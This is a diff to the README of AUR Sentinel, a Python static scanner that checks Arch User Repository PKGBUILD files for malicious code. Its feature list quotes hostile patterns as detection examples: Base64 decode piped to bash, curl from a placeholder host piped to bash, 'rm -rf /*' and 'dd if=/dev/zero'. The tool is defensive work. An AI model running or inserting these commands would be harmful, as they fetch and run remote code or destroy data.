@@ -1,31 +1,56 @@
 # AUR Sentinel
 
-A static analysis tool designed to scan Arch User Repository (AUR) `PKGBUILD` files for malicious payloads, obfuscated code, and security risks. 
+> A static analysis tool designed to scan Arch User Repository (AUR) `PKGBUILD` files for malicious payloads, obfuscated code, and security risks.
 
-It provides a focused security signal before `makepkg`; it does not guarantee that a package is safe.
+AUR Sentinel provides a focused security signal before you run `makepkg`. It acts as a defense mechanism against malicious actors attempting to deploy cryptominers, reverse shells, or system destruction commands via the community-driven AUR.
 
-## Why?
-The AUR is community-driven. While most packages are safe, malicious actors occasionally upload PKGBUILDs containing cryptominers, reverse shells, or `rm -rf /*` payloads. AUR Sentinel catches them *before* you run `makepkg`.
+## Features
 
-## Detection Capabilities
-* Base64 Obfuscation (`echo "..." | base64 -d | bash`)
-* Malicious external binary fetching (`curl -s http://unknown-ip | bash`)
-* System destruction commands (`rm -rf`, `dd if=/dev/zero`)
-* Execution from `/tmp` or `/dev/shm`
-* SSH Key stealing attempts
+- **Deobfuscation Detection:** Identifies Base64 obfuscation techniques (e.g., `echo "..." | base64 -d | bash`).
+- **Network Threat Detection:** Flags malicious external binary fetching (`curl -s http://unknown-ip | bash`).
+- **Destructive Command Detection:** Detects system destruction commands (`rm -rf /*`, `dd if=/dev/zero`).
+- **Unauthorized Execution:** Warns about execution from `/tmp` or `/dev/shm`.
+- **Credential Theft Prevention:** Identifies SSH Key stealing attempts.
+- **Risk Scoring:** Returns a comprehensive risk score (0 to 100) alongside matching source lines.
+
+## Architecture
+
+The tool is a read-only static analyzer written in Python. It evaluates the raw text of `PKGBUILD` scripts against a defined set of security signatures without ever executing the file. Future milestones will include fetching AUR snapshots, inspecting `.SRCINFO`, verifying source hashes, and generating machine-readable reports.
+
+## Tech Stack
+
+- **Language:** Python
+- **Package Manager:** uv
+
+## Getting Started
+
+### Prerequisites
+
+- Python 3.11+
+- `uv` installed.
+
+### Installation
+
+1. **Clone the repository:**
+   ```bash
+   git clone https://github.com/AspenQlio/aur-sentinel.git
+   cd aur-sentinel
+   ```
+2. **Sync dependencies:**
+   ```bash
+   uv sync
+   ```
 
 ## Usage
+
+Run the scanner against a local `PKGBUILD` file:
+
 ```bash
-uv sync
 uv run aur-sentinel scan ./PKGBUILD
 ```
 
-The command returns a risk score from 0 to 100 and reports the matching source lines. It never executes the scanned file.
+*Note: AUR Sentinel provides a security signal, not a guarantee. Static signatures can produce false positives and false negatives. Always review every `PKGBUILD`, upstream source, maintainer history, and package comments before installation.*
 
-## Current milestone
+## License
 
-The initial rule set detects direct pipe-to-shell downloads, Base64 execution, destructive root deletion, SSH key access, and execution from shared memory. Future milestones can fetch AUR snapshots, inspect `.SRCINFO`, verify source hashes, and export machine-readable reports.
-
-## Limitations
-
-Static signatures can produce false positives and false negatives. Review every `PKGBUILD`, upstream source, maintainer history, and package comments before installation.
+This project is licensed under the MIT License.
